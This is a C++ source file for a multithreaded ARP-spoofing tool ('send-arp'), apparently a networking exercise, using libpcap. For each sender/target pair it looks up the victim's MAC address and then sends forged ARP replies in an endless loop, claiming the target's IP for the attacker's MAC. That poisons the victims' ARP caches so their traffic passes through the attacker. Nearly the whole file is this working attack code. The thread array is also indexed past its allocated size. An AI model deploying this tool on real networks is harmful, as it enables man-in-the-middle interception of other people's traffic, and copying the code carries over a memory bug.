#include <cstdio>
#include <pcap.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/ioctl.h>
#include <net/if.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>

#include "util.h"
#include "mainstruct.h"
#include "arpattk.h"

// #pragma pack(push, 1)
// struct EthArpPacket final {
// 	EthHdr eth_;
// 	ArpHdr arp_;
// };
// #pragma pack(pop)

// #pragma pack(push, 1)
// struct MultiArgv {
// 	pcap_t* handle;
// 	char* sender_ip;
// 	char* target_ip;
// 	char* attacker_ip;
// 	uint8_t* attacker_mac;
// };
// #pragma pack(pop)


void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// uint8_t* get_host_mac(ifreq ifr, ifconf ifc, char* interface_name){
//     char buf[1024];
//     int success = 0;

//     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
//     if (sock == -1) { /* handle error*/ };

//     ifc.ifc_len = sizeof(buf);
//     ifc.ifc_buf = buf;
//     if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

//     struct ifreq* it = ifc.ifc_req;
//     const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

//     strcpy(ifr.ifr_name, interface_name);
// 	if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
// 		if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
// 			if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
// 				success = 1;
// 			}
// 		}
// 	}
// 	else { /* handle error */ }

//     static uint8_t mac_address[6];
// 	char* ip;

//     if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);

// 	return mac_address;
// }

// char* get_host_ip(ifreq ifr, char* interface_name){
// 	size_t if_name_len=strlen(interface_name);
// 	if (if_name_len<sizeof(ifr.ifr_name)) {
// 		memcpy(ifr.ifr_name, interface_name, if_name_len);
// 		ifr.ifr_name[if_name_len] = 0;
// 	} else {
// 		printf("interface name is too long");
// 	}

// 	int fd = socket(AF_INET,SOCK_DGRAM,0);
// 	if (fd == -1) {
// 		printf("%s", strerror(errno));
// 	}
// 	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
// 		int temp_errno = errno; 
// 		close(fd);
// 		printf("%s", strerror(temp_errno));
// 	}

// 	close(fd);

// 	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
// 	static char ip_addr_str[15];
// 	inet_ntop(AF_INET, &ipaddr->sin_addr, ip_addr_str, sizeof(ip_addr_str));
// 	//  inet_ntop(AF_INET,&addr.s_addr,buf,sizeof(buf));

// 	return ip_addr_str;
// }

// void arp_request(pcap_t* handle, char* sender_ip, char* attacker_ip, uint8_t* attacker_mac){
// 	EthArpPacket packet;

// 	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
// 	packet.eth_.smac_ = Mac(attacker_mac);
// 	packet.eth_.type_ = htons(EthHdr::Arp);
// 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
// 	packet.arp_.pro_ = htons(EthHdr::Ip4);
// 	packet.arp_.hln_ = Mac::SIZE;
// 	packet.arp_.pln_ = Ip::SIZE;
// 	packet.arp_.op_ = htons(ArpHdr::Request);
// 	packet.arp_.smac_ = Mac(attacker_mac);
// 	packet.arp_.sip_ = htonl(Ip(attacker_ip));
// 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
// 	packet.arp_.tip_ = htonl(Ip(sender_ip));

// 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
// 	if (res != 0) {
// 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
// 	}
// }

// Mac get_sender_mac(pcap_t* handle, char* sender_ip, char* attacker_ip, uint8_t* attacker_mac){
// 	//find my packet
// 	while(true){
// 		struct pcap_pkthdr* pkt_header;
//         const u_char* packet;
//         int res = pcap_next_ex(handle, &pkt_header, &packet);

// 		if (res == 0) continue;
//         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
// 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
// 			break;
// 		}
        
// 		EthHdr* ethernet = (EthHdr*)packet;
// 		Mac rec_mac = ethernet->dmac();
// 		Mac attk_mac = attacker_mac;

// 		if(rec_mac != attk_mac){
// 			continue;
// 		}

// 		if(ethernet->type() != ethernet->Arp){
// 			continue;
// 		}
		
// 		packet += sizeof(EthHdr);
// 		ArpHdr* arp = (ArpHdr*)packet;
// 		Ip rec_ip = arp->sip();
// 		Ip sdr_ip = (Ip)sender_ip;

// 		if(rec_ip != sdr_ip){
// 			continue;
// 		}

// 		printf("[+]%s => [me] : MAC_ADDR RECEIVED SUCCESS!\n", ((std::string)rec_ip).c_str());
// 		printf("[+]RECV: %s\n", ((std::string)ethernet->smac()).c_str());
// 		return ethernet->smac();
// 	}
// 	return Mac::nullMac();
// }

// void send_arp(pcap_t* handle, EthArpPacket packet){
// 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
// 	if (res != 0) {
// 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
// 	}
// }

// EthArpPacket set_arp_packet(EthArpPacket packet, char* sender_ip, Mac sender_mac, char* target_ip, char* attacker_ip, uint8_t* attacker_mac){
// 	packet.eth_.dmac_ = Mac(sender_mac);
// 	packet.eth_.smac_ = Mac(attacker_mac);
// 	packet.eth_.type_ = htons(EthHdr::Arp);

// 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
// 	packet.arp_.pro_ = htons(EthHdr::Ip4);
// 	packet.arp_.hln_ = Mac::SIZE;
// 	packet.arp_.pln_ = Ip::SIZE;
// 	packet.arp_.op_ = htons(ArpHdr::Reply);
// 	packet.arp_.smac_ = Mac(attacker_mac);
// 	packet.arp_.sip_ = htonl(Ip(target_ip));
// 	packet.arp_.tmac_ = Mac(sender_mac);
// 	packet.arp_.tip_ = htonl(Ip(sender_ip));

// 	return packet;
// }

// void* arp_send_attack(void* thread_argv){
// 	EthArpPacket packet;
// 	MultiArgv* attack_data = (MultiArgv*)thread_argv;

// 	printf("[>]THREAD START!\n");
// 	arp_request(attack_data->handle, attack_data->sender_ip, attack_data->attacker_ip, attack_data->attacker_mac);
// 	Mac sender_mac = get_sender_mac(attack_data->handle, attack_data->sender_ip, attack_data->attacker_ip, attack_data->attacker_mac);
// 	if(sender_mac == NULL){
// 		printf("get sender mac failed\n");
// 	}

// 	packet = set_arp_packet(packet, attack_data->sender_ip, sender_mac, attack_data->target_ip, attack_data->attacker_ip, attack_data->attacker_mac);
// 	printf("[+]%s ATTACK START!\n", attack_data->sender_ip);
// 	while(true){
// 		send_arp(attack_data->handle, packet);
// 	}
// }

void print_info(char* sender_ip, char* target_ip){
	printf("==========================================================\n");
	printf("[SENDER] %s -> [TARGET] %s\n", sender_ip, target_ip);
	printf("==========================================================\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc) % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    char* dev_name = argv[1];

    // pcap open
    pcap_t* handle = pcap_open_live(dev_name, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	struct ifreq attacker_ifr;
    struct ifconf attacker_ifc;

	uint8_t* attacker_mac = get_host_mac(attacker_ifr, attacker_ifc, dev);
	char* attacker_ip = get_host_ip(attacker_ifr, dev);

	pthread_t* thread = (pthread_t*)malloc(sizeof(pthread_t) * (argc / 2));
	for(int i = 2; i < argc; i += 2){
		char* sender_ip = argv[i];
		char* target_ip = argv[i + 1];

		MultiArgv *attack_data = (MultiArgv *)malloc(sizeof(MultiArgv));
		attack_data->handle = handle;
		attack_data->sender_ip = sender_ip;
		attack_data->target_ip = target_ip;
		attack_data->attacker_ip = attacker_ip;
		attack_data->attacker_mac = attacker_mac;

		
		print_info(sender_ip, target_ip);
		pthread_create(&thread[i], NULL, arp_send_attack, (void*)attack_data);
	}
	
	for(int i = 2; i < argc; i += 2){
		pthread_join(thread[i], NULL);
	}

	free(thread);
	pcap_close(handle);
}
